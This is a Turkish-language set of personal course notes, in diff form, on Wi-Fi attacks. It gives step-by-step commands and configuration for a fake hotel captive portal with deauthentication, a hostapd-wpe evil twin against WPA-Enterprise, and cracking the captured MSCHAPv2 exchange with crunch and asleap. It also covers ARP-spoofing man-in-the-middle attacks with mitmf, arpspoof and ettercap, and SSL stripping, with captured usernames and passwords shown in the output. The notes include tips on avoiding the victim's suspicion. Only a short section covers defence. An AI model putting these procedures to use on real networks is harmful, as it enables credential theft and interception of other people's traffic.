+ eğer çalışmaz ise service network-manager restart çalıştırıp ardından tekrar hostapd /root/Documents/hotspot/hostapd.conf -B çalıştırmayı deneye 
+ biliriz ve windows umuzdan wifi kısmından hotel wifi v2 isimli modemi görüntüleyerek komutumuzu çalıştırdığımızı doğrulayabiliriz 
+
+ bu dersimizde captive portal çalıştırmak konusunu öğrenelim kali terminalimize gelip ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 çalıştırıyoruz 
+ (bu komutun ne yaptığını araştır buraya yaz)  ardından service apache2 start çalıştırıyoruz
+
+ardından dnsmasq -C /root/Documents/hotspot/dnsmasq.conf çalıştırıyoruz (bu komut ne işe yarıyor bu komutu çalıştırarak ne yaptık araştır buraya yaz)
+
+ ardından sanal windows bilgisayarımızdan veya ana windows bilgisayarımızdan hotel wifi v2 ye bağlanıyoruz
+
+ ve windows cihazımızdaki tarayıcımızdan herhangi bir websitesine gitmek istediğimiz zaman karşımıza captive portal sayfası çıkıyor 
+
+ yapmaya çalıştığımız işlem gerçekleşti ancak bir kaç tane hatayla bu hatalardan biri biz wifi hotel v2 ağına bağlandığımızda 
+ captive portal otomatik olarak bir pencere şeklinde açılmadı biz tarayıcıdan bir siteye gittiğimiz zaman açıldı 
+ 2. si de google.com / facebook.com gibi sitelere girdiğimizde tarayıcımız bize hata verdi bu siteler HSTS protokolünü kullandıkları için 
+
+ eğer biz ağa bağlandığında direk olarak bir pencere ile captive portalı kurbanımızın karşısına çıkarırsak daha az şüphe çekici olur 
+  çünkü kullanıcımız google.com a veya hsts kullanan herhangi bir web sayfasına gitmek istediğinde ve bu siteyi görüntülemeyince şüphelenme 
+  ihtimali çok yüksektir 
+
+  bu dersimizde Yönlendirme Kuralları konusunu öğrenelim 
+
+  yeni oluşturduğumuz modeme bağlanınca otomatik olarak kullanıcının karşısına captive portalın olduğu sayfayı getirmek için şöyle bir yöntem kullanabiliriz 
+
+  bilgisayarımızdan bir ağa bağlandığımızda bir request yollanır (nereye?) eğer istekler normal bir şekilde geri dönerse güvenli bir internet 
+  bağlantımızın olduğu kabul edilir eğer dönmez ise request gönderilen web sayfasının (yani bizim captive portalımızın) bir captive portal olabi 
+  leceğinden şüphelenilir buna www yönlendirmesi denir (çünkü başında www. olan siteler gerçekten bir domain sunucusuna kayıtlı fiziksel gerçek 
+internete açık bir websiteleridir bizim captive portalımız böyle olmadığı için bizi captive portal olarak algılar ve bu yüzden ağa bağlandıktan 
+sonra captive portal penceremizi otomatik olarak karşımıza getirmez) 
+
+bu isteklerin doğru bir şekilde işlenmesi için www yönlendirmesini kaldırmamız gerekiyor daha doğrusu kendimiz yeni bir yönlendirme yazmamız gerekiyor 
+
+bu www yönlendirmesini kaldırıp kendi yönlendirmemizi yazma işlemine web devolopment da rewrite condition denir 
+
+bu işlem web sitelerinde kullanılır htaccess denilen bir dosya var bu dosyanın içerisinde kullanılır 
+
+https://wpbeaches.com/redirecting-a-web-folder-directory-to-another-directory-in-htaccess/ bu bağlantıda 
+
+Redirecting WWW to non-WWW with htaccess
+başlığının altında
+
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+
+şeklinde bir regex kodu var bu koddaki ^www\.(.*)$ [NC] kısmı eğer adres çubuğunda www ifadesini görüyorsan onu kaldır 
+http://%1/$1 [R=301,L]  --> yerine http ifadesini ekle ve bağlantıyı bu şekilde başlat 
+
+ancak bu kodu yazmamıza rağmen iphone cihazlarda kodumuz çalışmayabiliyor 
+
+kali terminalimize geliyoruz leafpad /etc/apache2/sites-enabled/000-default.conf çalıştırıyoruz 
+
+bu dökumandan öğrendiğimize göre DocumentRoot = /var/www/html miş ama document root ne demek araştır buraya yaz 
+
+bu dökumanın </VirtualHost> kısmının altına 
+
+<Directory "/var/www/html">
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+	
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ / [L,QSA]
+</Directory>
+
+ekliyoruz 
+
+yani dökumanımızın tamamı şu şekilde olur 
+
+<VirtualHost *:80>
+	# The ServerName directive sets the request scheme, hostname and port that
+	# the server uses to identify itself. This is used when creating
+	# redirection URLs. In the context of virtual hosts, the ServerName
+	# specifies what hostname must appear in the request's Host: header to
+	# match this virtual host. For the default virtual host (this file) this
+	# value is not decisive as it is used as a last resort host regardless.
+	# However, you must set it for any further virtual host explicitly.
+	#ServerName www.example.com
+
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+	ErrorDocument 404 /
+
+	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+	# error, crit, alert, emerg.
+	# It is also possible to configure the loglevel for particular
+	# modules, e.g.
+	#LogLevel info ssl:warn
+
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+	# For most configuration files from conf-available/, which are
+	# enabled or disabled at a global level, it is possible to
+	# include a line for only one particular virtual host. For example the
+	# following line enables the CGI configuration for this host only
+	# after it has been globally disabled with "a2disconf".
+	#Include conf-available/serve-cgi-bin.conf
+
+</VirtualHost>
+
+<Directory "/var/www/html">
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+	
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ / [L,QSA]
+</Directory>
+
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+
+
+bu dökumanda
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ / [L,QSA]
+
+kısmı iphone cihazlarda yaşanan problemi çözmek için ekstra olarak eklememiz gereken regex kısmı 
+
+eğer kullanıcı sayfada error 404 hatası alacak bir işlem veya uç noktaya giderse dökumanımızdaki ErrorDocument 404 / satırı ile kullanıcımızı 
+root dizinine yani (root dökumanına /var/www/html dosyasındaki indexe yönlendirilir)
+
+ardından dökumanımızı ctrl+s ile kaydediyoruz ve kali terminalimize geliyoruz bu yazdığımız / eklediğimiz kuralların geçerli olması / çalıştırılması 
+için rewrite kuralları özellğini aktifleştirmemiz gerekiyor bunun için terminalimize a2enmod rewrite çalıştırıyoruz 
+
+rdından service apache2 start çalıştırıyoruz (veya service apache2 restart da çalıştırabiliriz)
+
+ardından sanal bir windows veya sanal olmayan bir windows cihaza geliyoeuz  wlan dan hotel wifi v2 ye tıklayıp bağlanıyoruz 
+ve bağlandıktan hemen sonra karşımıza captive portal ın görüntülendiği bir pencere açılacak daha sonra açılan pencerenin arama çubuğuna 
+facebook / google veya www.facebook.com / www.gpogle.com çalıştırdığımızda ilgili siteleri açmıyor yine captive portal sayfasına kullanıcıyı yönlendiriyor 
+
+eğer varsa bir iphone telefondan yeni oluşturduğumuz ağa bağlanıyoruz ve burada da bağlandıktan hemen sonra karşımıza bir captive portal sayfası 
+açılıyor 
+
+bu senaryoda bir hotelin wifi yında olan bir kullanıcı deauthentication -yetkisizlendirme- saldırısıyla orijinal hotel wifi ağından düşürülür 
+ve kullanıcı yeniden orijinal ağa bağlanamaz bu durumda bizim oluşturduğumuz hotel wifi v2 ağına bağlanır ve username ve şifre 
+kısmına orijinal ağa bağlanmak için girdiği kullanıcı adı ve şifreyi bizim captive portalımıza girecek 
+
+girdiği bu kullanıcı adı ve şifreyi okumak için wireshark çalıştırıyoruz terminalimizde ardından açılan wireshark penceresinde wlan0 
+yu seçiyoruz ve sol üstteki küçük mavi köpek balığı yüzgeçi ikonuna tıklıyoruz (Start capturing packets) 
+
+ardından iphone veya mevcut olan telefondan username : atil password: 123456 giriyoruz daha sonra Submit butonuna basıyoruz 
+ve bastıktan sonra tekrar captive portal sayfasına yönlendirilecek kullanıcı bu şekilde ayarladık çünkü 
+(eğer oluşturduğumuz modem ile internet verebiliyorsak onu direkt olarak google.com a yönlendirmek daha mantıklı ve şüphe çekmeyecek 
+bir hareket olmaz mıydı bunu araştır buraya yaz böyle bir şey yapabiliyor muyuz diye) kullanıcı tekrar captive portal page ine yönlendirilince 
+muhtemelen buranın da çalımadığını düşünerek bu ağdan bağlantısını sonlandırıp orijinal ağa geçmek isteyebilir biz de bu sırada onun submit ettiği 
+bilgileri wireshark üzerinden alalım 
+
+(şifreleri wireshark ile görüntülemeden önce bizim de kali de oluşturduğumuz hotel wifi v2 ye bağlı olmamız gerekiyor mu bunu araştır 
+buraya yaz)
+
+ardından wireshark a gelip yüzgeç ikonunun hemen sağındkai kırmızı kare (stop capturing packets) butonuna basıyoruz 
+
+ardından mavi ikonun hemen altındaki satır boyunca uzanan inputa http yazarak (bir filtreleme yaparak sadece HTTP protokolü ile alakalı verilerin
+gelmesini sağlayabiliriz )
+
+gelen çıktılardan yukarıdan aşağı Info satırında POST yazan paketleri sırayla açıyoruz bu paketleri açtığımızda açılan kısımda 
+HTML Form URL Encoded : başlığını detaylandırarak submit edilen bilgileri burada görebiliriz çünkü submit işlemi bir form üzerinden gerçekleştiril
+di (her zaman bir form üzeirnden mi gerçekleştir bunu araştır buraya yaz)
+
+burada POST metodu bir bilgi submit edilirken kullanılan bir yöntemdir örneğin instagram veya facebook da bir yorum yazarken mesaj atarken 
+bie gönderi oluşturma işlemleri gibi 
+
+ve ilgili paketi detaylandırdığımızda Form item : "username" = "atil" Form item : "password" = "123456" bilgilerini görüyoruz 
+
+wpa enterprise = wpa in bir çeşididir ve genellikle şirketlerde kullanılır. klasik wpa şifreleme yönteminden daha karmaşık bir şifreleme yöntemi 
+kullanılır wpa enterprise da 
+
+wlan üzerinden bir ağa tıkladığımızda login ekranında 
+
+Mode:
+Username: 
+Password: 
+
+inputları bizi karşılıyorsa muhtemelen o ağ wpa enterprise ile korunuyordur yani klasik olarak modemin tek bir şifresi yok her kullanıcıya ait 
+bir şifre var ve kullanıcılar kendi şifreleri ile bu ağa giri yapaibliyorlar 
+
+wpa enterprise da radius denilen merkezi bir sunucu bulunur 
+
+Pre-shared key (PSK) : Bu kavram, daha önceden paylaşılmış anahtar demek.Bu anahtar tüm kullanıcılara dağıtılıyor ve eğer bu şifreyi biliyorsan 
+(bu tek bir şifre mi yoksa birdenfazla mı araştır buraya yaz) bu şifre ile ağa girebiliyorsun ancak wpa enterprise da böyle bir şifre yok 
+
+wpa enterprise da ağa girecek mevcut kullanıcıların username ve passwordleri oluşturuluyor ve bu kimlik bilgileri radius denilen merkezi bir sunucu 
+tarafından koordine ediliyor (Düzen ve uyum sağlamak)
+
+bircihaz wpa enterprise kullanan bir modeme bağlanmak istediğinde modeme göndermiş olduğu request i modem, radius sunucuya iletiyor 
+radius sunucu da bir challange (zorluk / bu zorluk tam olarak nedir onu araştır buraya yaz detaylıca) oluşturuyor ve eğer kullanıcı 
+radius un veritabanındaki kullanıcı adı ve şifre yi submit ederse bu challange kırılarak ağa bağlanabiliyor kullanıcı
+
+bir wpa enterprise ağınını hacklemek oldukça zordur biz wpa enterprise ı hacklemek için evil twin saldırısını kullanalım 
+bir wpa enterprise ağı oluşturup ağdaki kullanıcıları orijinal ağlarından kopartıp bizim sahte ağımıza bağlanmalarını sağlayıp 
+orijinal ağda kullandıkları kimlik bilgilerini bize submit etmelerini  sağlamamız gerekiyor 
+
+wpa enterprise da modem ile radius sunucu arasındaki request-challange-response işlemleri WPA ile şifrelenmiştir 
+
+biz burada şunu yapmak istiyoruz kullanıcı bilgilerini girdiğinde kullanıcı adı clear bir ifade olarak gelecek ama şifresi yine wpa ile hashlenmiş olarak 
+bize gelecektir biz bu hash li ifadeyi bir wordlist e tabi tutarak kırmayı deneyelim 
+
+şimdi kali terminalimizi açıyoruz apt-get install hostapd-wpe çalıştırıyoruz ardından leafpad /etc/hostapd-wpe/hostapd-wpe.conf çalıştırıyoruz 
+bu komutla /etc içerisindeki hostapd-wpe konfigrasyon dosyasını değiştiriyoruz 
+
+açılan dökumanda 3. satırda interface=wlan0 yazması gereklidir ardından 
+# 802.11 Options 
+ssid=wpa-enterprise-modem-ismi 
+
+oluşturacağımız modemi ismlendirme konusunda şirketin modemlerinin isimlerini inceleyip bunlar arasında her ikisine de benzeyen örneğin v2 v3 
+şeklinde bir pattern var ise bu pattern a yönelim bir isimlendirme de bulunmak çok önemlidir şüphe çekmemesi için ardından ctrl+s diyerek 
+kaydediyoruz dökumanımızı 
+
+bu noktadan sonra wpa-enterprise ağına bağlı olan bir kullanıcıya veya bütün ağa / modeme deauthentication (yetkisizlendirme) saldırısı yapabiliriz 
+beya 2-3 kullanıcıyı sçeip onlara bir yetkisizlendirme saldırısı yapabiliriz 
+
+ardından kali terminalimizde service network-manager stop çalıştırıyoruz daha sonra hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf çalıştırıyoruz 
+(bu dizindeki dosya nerede ise onu yazmamız gerekiyor yani hostapd-wpe.conf dosyası)
+
+gelen çıktıda wlan0: AP-ENABLED alıyorsak wpa-enterprise modemimizi başarıyla oluşturduk demektir 
+
+bu dersimizde evil twin ile ağımıza bağlanmasını sağladığımız kullanıcının kullanıcı adını almayı öğrenelim 
+
+öncelikle ağdan yetkisizlendirmek istediğimiz kullanıcıyı düşürüyoruz ve kullanıcı ağdan düştü daha sonra bizim modemimize wlan listesinden seçip 
+tıkladı login ekranı geldi bu kısımda başka bir cihazdan login kısmına geliyoruz 
+
+Mode:Automatic
+Username:atil 
+Password:xxxyy123
+
+yazdıktan sonra Join/Katıl/Bağlan butununa basıyoruz 
+
+ardından kali terminalimize geldiğimizde gelen çıktıda mschapv2: başlığının altında 
+
+	username:atil 
+	challange:a2:57:78ae:f6:33:e8:58
+	response: 
+
+	şeklinde kullanıcı adı challange ve response değerlerini görüyoruz burada challange ve response değerleri hashlenmiş bir şekilde gördüğümüz 
+	gibi 
+
+	artık bu çıktıları aldığımıza göre ctrl+c ile yayında olan modemimizin yayınını durdurabiliriz 
+	bu yayını durdururken eğer aynı ada bir deauthentication saldırısı da çalışmaya devam ediyorsa onu da durdurmamız gerekiyor çünkü yetkisiz 
+	lendirdiğimiz kullanıcı orijinal ağa bağlanamayınca lüphelenip teknik çalışana durumdan bahsedebilir 
+
+	bu dersimizde challange ve response hashlerini kullanarak şifreyi kırmayı deneyeceğiz 
+	kali terminalimizde crunch 8 8 xyz123 -o wordlist çalıştırıyoruz ardından yeni bir terminal tab ı açıyoruz asleap çalıştırırsak bu toolun nasıl 
+	kullanılacapıyla alakalı help sayfası ve kullanılacak parametreler karşımıza çıkacaktır az önce yazdığımız komuttaki -o wordlist ifadesi 
+	ilgli kurallar ile oluşturacağımız wordlist i /root/wordlist ismiyle bu dizine kayıt etmemiz içindir 
+
+	açtığımız bu yeni tab da asleap -C challange-hashi -R response-hashi -W /root/wordlist çalıştırıyoruz 
+
+	challange ve response hash lerini kırma hızı modemden aldığımız authentication packetini kırmaktan daha hızlıdır bunun sebebi endir araştır buraya yaz 
+	ve kırma işlemimiz çok kısa bir sürede bitti gelen çıktıda 
+
+	hash bytes: 
+	NT hash:
+	password:
+
+	ifadelerinden biizm aradığımız kısım password kısmındaki değerdir bu parolamızın clear metin halidir (nt has ve hash bytes satırları hangi 
+	bilgileri ifade ediyor araştır buraya yaz bir de <jwright@hasborg.com> şeklinde bir mail adresi var bu mail adresi neden çıktılar araınsda geldi 
+	bizim yaptığımız işlemle alakası ne yoksa tool u geliştiren kişinin mailimi araştır buraya yaz)
+
+wpa-enterprise şifresini kırma işlemi bu şekilde gerçekleşir kullanıcı adının ne olduğunu zaten öğrenmiştik şimdi de şifreyi kırdık bu ikisini 
+kullanarak ilgili ağa erişim sağlayabiliri< 
+
+bu dersimizde örneğin biz bir kurumu yönetiyoruz ve kurumumuzda wpa-enterprise kullanılıyor bu ağa bağlı olan personellerimizi güvenli 
+bir şekilde yönetmek için yani güvenli kullanıcılara sahip olmak için şunları yapabiliriz
+
+*wpa enterprise için kullanıcıları eğitmek 
+
+*geçerli ağ isimlerini organizasyonla paylaşmak (buradkai organizasyondan kasıt kim onu anlamadım)
+
+*modem şifrelerini web arayüzlerine girmemek 
+
+*sosyal mühendislik saldırılarına karşı bilgilendirmek 
+
+yani örneğin kurumun resmi ağında şirket-1, şirket-2 şeklinde 2 tane ağ varsa şirket3 diye bir ağ görürlerse kesinlikle bağlanmamaları gerektiğini 
+personellerimize söylememiz gerekiyor 
+
+
+bu bölümde wifi şifresini kırdıktan sonra yani ilgili ağa bağlantımız gerçekleştikten sonraki saldırı yöntemleri hakkında konuşalım 
+
+kali ve windows sanal makinalarımızın ikisini de NAT Network e alıp eş zmaanlı olarak çalıştırıp saldırılarımızı gerçekleştirelim 
+
+ağa bağlantı sonrasındaki saldırılar genelde genellikle kurban kullanıcının yolladığı ve aldığı veri paketlerini ele geçirip kurbanın 
+kullandığı kullanıcı adı,şifrelerini vs ele geçirmek ile alakalıdır bu saldırılar içerisindeki en önemli yöntemlerden biride MITM yani ortadaki 
+adam saldırısıdır 
+
+bu dersimizde aynı ağa kablosuz olarak bağlı iki farklı fiziksel cihazda hacking işlemlerimizi gerçekleştirelim 
+
+kali terminalimizde echo 1 > /proc/sys/net/ipv4/ip_forward çalıştırarak ip forwarding yapıyoruz (ip forwarding işlemi nedir nasıl gerçekleşir 
+süreçleri nedir araştır açık anlaşılır ve detaylı bir şekilde buraya yaz)
+
+ardından kali terminalimizde mitnf --arp --spoof --gateway modem-local-ip-adresi --target kurban-local-ip-adresi -i wlan0 çalıştırıyoruz
+(eğer kurban ve modem lokal ip lerini bilmiyorsak netdiscover veya nmap gibi araçlar ile bu bilgileri öğrenebiliriz bu toollar ile bu bilgileri 
+nasıl öğrenebildiğini araştır detaylı anlaşılır bir şekilde komutlarını sırayla yaz)
+
+ardından kurban bilgisayarımıza geliyoruz ve command prombt unda arp -a çalıştırıyoruz ve bağlı olduğu ağdaki arp table ı görüntülüyoruz 
+bu tabloda modem mac adresi ile kali cihazımızın mac adresi aynıysa saldırımız başarıyla gerçekleşmiş demektir 
+
+eğer saldırımız başarıyla gerçekleşmişse kurban bilgisayarın browserına geliyoruz unicornitems.com a gidiyoruz sayfanın sağ üstündeki my account 
+kısmına tıklıyoruz username or email adress : testtest password : 123456 yazıyoruz ardınan login diyerek submit ediyoruz 
+
+ardından kali arp spoof çalıştırdığımız terminal tabımıza geri dönüyoruz ve gelen çıktılar arasında username:testtest&password:123456 
+olan satırdan istediğimiz bilgileri elde etmiş olduk 
+
+bu dersimizde arp spoofing işlemini bir tool kullanmadan manual olarak yapmayı öğrenelim 
+
+kali den terminalimize gelip arpspoof -i wlan0 -t kurbanın-localip-adresi modemin-local-ipsi çalıştırıyoruz daha sonra new tab dan yeni bir 
+terminal açıyoruz arpspoo-i wlan0 -t modemin-local-ipsi kurbanın-local-ipsi (yani ilk terminalde yazdığımız sıranın tersinden komutu çlaıştırdık 
+ilk jımutumuzda önce hedef cihazın ip sini yazdık sonra modemin ip sini burada da önce modem ipsi sonra hedef cihazın ipsini yazdık)
+
+ardından hedef cihazın komut istemcisinde arp -a yaparak saldırımızın başarıyla gerçekleşip gerçekleşmediğini doğrulayabiliriz 
+
+yani bu dersimizde mitmf çalışmaz ise veya çalışırken herhangi bir sorunla karşılaşırsak o zaman arp spoofing işlemini önce manuel yapıp 
+(2 tabda ve önce kurban ipsi-modem ipsi 2. tabda da önce modem ipsi-kurban ip si şeklinde çalıştırabiliriz) 3. bir terminal tab ı açıp 
+buradan da mitmf ü çalıştırarak gelen giden verileri dinleyebiliriz 
+
+
+bu dersimizde mitmf ile aynı işlemi gerçekleştiren alternatif başka bir tool u inceleyelim bu toolun ismi ettercap dir 
+
+kali terminalimize gelip leafpad etc/ettercap/etter.conf çalıştırıyoruz bu dosya ettercap toolunun konfigrasyon dosyasıdır bu dosyada bir takım 
+değişiklikler yapalım 
+
+bu dosyada arp_poison_delay özelliği bizim bir ağa arp spoofing saldırısı yaparken paketleri kaç saniye aralıklarla göndermek istediğimizi 
+ayarladığımız satırdır 
+
+böylece saldıracağımız ağ ın modeminde veya uç cihazda bir arp koruması var ise bu ayarları değiştirerek bu korumaları aşabiliriz 
+buradaki ayarları default olarak kullanabiliriz değiştirmemize gerek yok ancak arp saldırısına karşı çok iyi bir korumaya sahip bir ağa 
+saldırı yapacaksak bunları değiştirebiliriz 
+
+
+ctrl + f ye basıp Linux yazıyoruz ve bu kelimeyi aratıyoruz 
+
+#------------------------
+#      Linux
+#------------------------
+
+şeklinde bir başlık çıkacak  bu başlığımızın altındaki #redir_command_on = "iptables -t nat bu satırdaki konfigrasyonlar kurban bilgisardan verilerinin geldiği porttan 
+başka bir porta iletiyorduk biz bu işlemi manuel olarak da yapabiliyorduk örneğin gelen verileri 80 portundan bizim bilgisayarımıza al 8080 portuna ilet 
+(neden iletme ihtiyacı duyuyor veriyi bunu araştır buraya yaz) 
+
+örneğin kullanıcı http protokolü ile ağda geziniyor dolayısıyla ondan gelecek bilgiler 80 portundan (http nin portu 80 dir) geleceği için 
+eğer bizim proxy miz 8080 portunda bir dinleme yapıyorsa bu verileri okuyabilmemizi çin 80 portundan gelen bilgileri 8080 portuna yönlendirmemiz / iletmemiz 
+gerekiyor 
+
+ancak dökumanı ilk açtığımız zaman 
+
+#redir_command_on
+#redir_command_off şeklinde 
+
+#if you use iptables: satırının altındaki bu iki satırımız yorum satırına alınmış bu satırların başlarındaki # karakterini silerek 
+
+redir_command_on
+redir_command_off
+
+bu konfigrasyonlarımızı yoolumuzun çalıştırılabilir olarak algılamasını sağlıyoruz 
+
+ardından ctrl +f yaparak [privs] stringini aratıyoruz 
+
+[privs]
+ec_uid = 0 
+ed_gid = 0 
+
+şeklinde yukarıdaki satırlarımızın değeri eğer 0 dışında bir değer ise bunları 0 yapıyoruz 
+
+ardından konfigrasyon dosyamızı ctrl+s yaparak kaydediyoruz ve kapatıyoruz 
+
+ardından kali terminalimize gelip ettercap -Tq /// çalıştırıyoruz bu komut ile herhangi bir hedef belirtmeden ettercap toolumuzu çalıştırmış 
+oluruz komuttaki -T (text mode yani metin modunda başlat demek / arayüz modu var mı acaba ettercap in araştır buraya yaz) q da (quite)
+yani sessiz mode yapılan her işlemi ekrana çıktı olarak verme anlamındadır ettercap i çalıştırdıtan sonra l tuşuna basarak bağlı olduğumuz 
+ağdaki host(ana bilgisayar/ bir ağdaki host cihaz nedir birden fazla host cihaz olur mu host olması için hangi özelliklere sahip olması gerekiyor 
+bunu araştır detaylı bir şekilde buraya yaz) cihazları listeleyebiliriz eğer hiç bir çıktı almazsak yani ettercap ağda hiç host cihaz bulamazsa 
+bu işlemi netdiscover toolu ile de gerçekeleştirebiliriz (ağdaki host cihazlarını bulma işlemini)
+
+ardından q ya basarak ya da tercihen ctrl +c ye basarak ettercap den çıkabiliriz 
+
+bu dersimizde ettercap ile saldırı yapmaya başlayalmı 
+
+kali terminalimize geliyoruz ettercap -Tq -M arp-remote -i wlan0 /// çalıştırırsak (2 satır aşağıdaki satırı okuyup devam et)
+-M parametresi ettercap i hangi modda çalıştıracağımızı belirttiğimiz bir parametredir 
+komutumuzda /// karakterlerini yazdığımızda bağlı olduğumuz ağda hedef gözetmeksizin ağa bağlı olan kaç adet cihaz var ise onların hepsine 
+arp spoof saldırısı yap anlamına geliyor normalde uzun formatta saldırı komutumuzu yazmak istesek şu şekilde bir format kullanırdık 
+
+ettercap -Tq -M arp-remote -i wlan0 kurban-cihazın (mac_address/ipv4/ipv6/port) #komutta parantez yok sadece komutu yazarken hem hedef cihazın parantez 
+içerisindeki değerlerini hem de komutun devamında modemin bu parantez içerisindeki değerlerini yazmamız gerektiği için öyle yazdım 
+modem-cihazın (mac_address/ipv4/ipv6/port) şeklinde yazarız 
+
+
+ettercap -Tq -M arp-remote -i wlan0 /gateway-local-ipsi// /hedefcihaz-local-ipsi// çalıştırıyoruz ardıdan hedef cihazımın tarayıcısından 
+unicornitems.com adresine gidiyoruz sağ üstten my account kısmına gidiyoruz 
+
+username:test12345
+password:123456 
+
+yazıp login oluyoruz 
+
+ardından kaliye etter cap i başlattığımız terminalimize geri dönüyoruz gelen çıktılarda sondan 4. satırda HTTP : hedef-local-ipsi -> USER: 
+test12345 PASS: 123456 çıktısını aldık 
+
+
+ettercap çıktı olarak hedefin girdiği kullanıcı adı, şifre ve hangi siteye girdiği bilgisini ekrana bastırdı yani diğer toollardaki gibi 
+x sayfanın x sekmesine tıkladı y uç noktasına gitti vs gibi ayrıntılı bilgiler getirmez bize wireshark gibi bütün paketleri indirmez 
+yani ettercap in yaptığı sniffing işlemi şifreleri ele geçirmek üzerinedir 
+
+bu dersimizde ettercap ile hedef ağdaki birden fazla kullanıcıya arp spoofing saldırısı yapmayı öğrenelim 
+
+
+ettercap -Tq -M arp-remote -i wlan0 /gateway-local-ipsi// /127.20.10.7-20// çalıştırırsak hedef ağa bağlı olan ve lokal ip adresi 
+127.20.10.7 ile 127.20.10.20 arasındaki (.7 ve .20 dahil mi değil mi araştır buraya yaz) olan bütün cihazlara saldırı işlemi başlatabiliriz 
+bu .x ile .y arasındaki ip ye saldırma ismi ip range (ip aralığı) attack denir 
+
+örneğin netdiscover ile ağı taradığımızda 2 adet apple cihaz olduğunu gördük ve biz saldırımızı iPhone a yapmak istiyoruz ancak hangisinin 
+iphone hangisinin mac olduğunu bilmiyoruz bu gibi durumlarda spesifik olarak 2 ip adresine saldırmak istersek 
+
+ettercap -Tq -M arp-remote -i wlan0 /gateway-local-ipsi// /127.20.10.7, 127.20.10.10 // şeklinde ikisinin arasına virgül ( , ) karakterini 
+koymalıyız (peki 2 tane veya daha fazla virgül kullanım 3-4-5 tane ip seçebilir miyiz araştır buraya yaz)
+
+bu dersimizde mitm saldırısı yaparken SSL Strip naasıl yapılır bunu öğrenelim 
+
+kali terminalimeze ssltrip --help çalıştırarak bu tool için kullanabileceğimiz parametreleri görebiliriz 
+
+sslstrip bir prpxy dir ve bir portta çalışır bu yüzden bir porta ihtiyacımız var örneğin bu işlem için 10.000 portunu kullanabiliriz 
+
+kali terminalimizde iptables -t nat :A PREROUTING -p tcp --destination-port 80 -j REDIRECT -- to port 10.000 
+(en son yazdığım konu ile 80 portumuza gelen bilgileri 10.000 . route umuza yönlendirme işlemini gerçekleştiririz )
+
+(bu komuttaki nat kelimesinin ve tcp kelimesinin anlamı ne iyice araştır buraya yaz)
+
+daha sonra sslstrip çalıştırıyoruz sslstrik https veya hsts siteleri http ye downgrade etme işkemi anlamına gelir 
+
+ardından new tab diyerek yani bir terminal açıyoruz ettercap -Tq -M arp:remote -S i wlan0 /modem-local-ipsi // 
+/hedef-local-ipsi	 çalıştırıyoruz bu kodumuzdaki -S parametreesi kendimizin imzaladığı bir ssl certificet dir 
+ssl certificed https sitelerde kendi sertifikamızı oluşturup bu sertifikayı kullanıcıya imlazatmaya çalışabiliriz 
+fakat bu uygulamamızda yani sslstrip toolunu kullanırken bu özelliği kullanmamız gerekiyor bu kendi sertifikamızı oluşturup hedef 
+kullanıcıya bunu imzalatma işlemi manuel ssl strip işlemlerinde yapılır -S parametresi de kendi oluşturuduğumuz ssl sertifikasını değil 
+kendi toolun sertifikasını kullan demek (yoksa bu parametre hiç mi sertifika kullanma tamamen toolun kendi yöntemi ile strip et 
+anlamına mı geliyor bunu araştırıp buraya yaz) tabii ssltrip toolunu çalıştırmadan önce halihazırda hedef cihazımıza mitm saldırısı yapmış 
+olmamız ve saldırı arkaplanda çalışıyor olması gerekiyor ardından hedef bilgisayarımızın browserından outlook.com adresine gidiyoruz 
+https olan bu siteyi http ye downgrade ettiğini görebiliriz username atilsamancıoglu password 123456 olarak login oluyoruz 
+daha sonra kali linux dan ettercap in çalıştığı terminale dönüyoruz gelen çıktıda HTTP: 131.253.61.82.80 -> USER : atilsamancıoglu 
+PASS: 123456 olarak bilgileri aldığımızı görebiliriz aynı şekilde bing.com a girdiğimiz zaman onu da http ye downgrade edildiğini görebiliriz 
+
+ancak bu strip işlemi tarayıcıdan tarayıcıya göre siteden siteye göre çalışıp çalışmama durumları olabilir örneğin https bir sitede çalışabilirken 
+hsts bir sitede çalışmayabilir 100% garanti çalışır diye bir durum yoktur 
+
+mitm dan hedef cihazın bilgilerini eld ettikten sonra port forwarding işlemini resetleyip default ayarlara dönmek için kali terminalinde 
+iptables -t nat --flush komutunu çalıştırmamız gerekiyor (çalıştırmazsak ne olur araştır buraya yaz bir kaç örnek ver)
+
+örneğin bir routing kuralı koyduktan sonra başka bir routing yapmak istediğimizde çakışmalar yaşayabilirmişiz 
+
+bu dersimizde ettercap in içindeki bult-in tools ları öğrenelim 
+bu dersimizde windows ve kali sanal makinları NAT Netwok de eşzamanlı olarak çalıştıracağız 
+ardından kali terminalimize gelip ettercap -Tq -M arp:remote -S -i eth0 /10.0.2.4// <-----(windows-sanal local ip) /modem-local-ipsi//
+çalıştırıyoruz ardından saldırımızın çalıştığını teyit etmek için windows cmd de arp -a çalıştırıyoruz 
+
+ardından ettercap ın çalıştırıldığı terminale gelip p tuşuna bastığımızda ekrana ettercap içerisinde yüklü gelen plugins (eklentiler)
+listelenir bu eklentilerin bulunduğu satırın başındaki değer o eklentinin halihazırda o an aktif bir şekilde kullanılıyor mu bunu ifade eder 
+[0] ise kullanılmıyor demektir o anki mevcut saldırı için eklentinin hemen sağında 1.1 / 1.2 gibi değerler ne anlama geliyor araştır 
+buraya yaz ve en sağdaki kısımda da ilgili eklentinin ne işe yaradığını hangi amaçlar için kullanılabileceği yazılıdır 
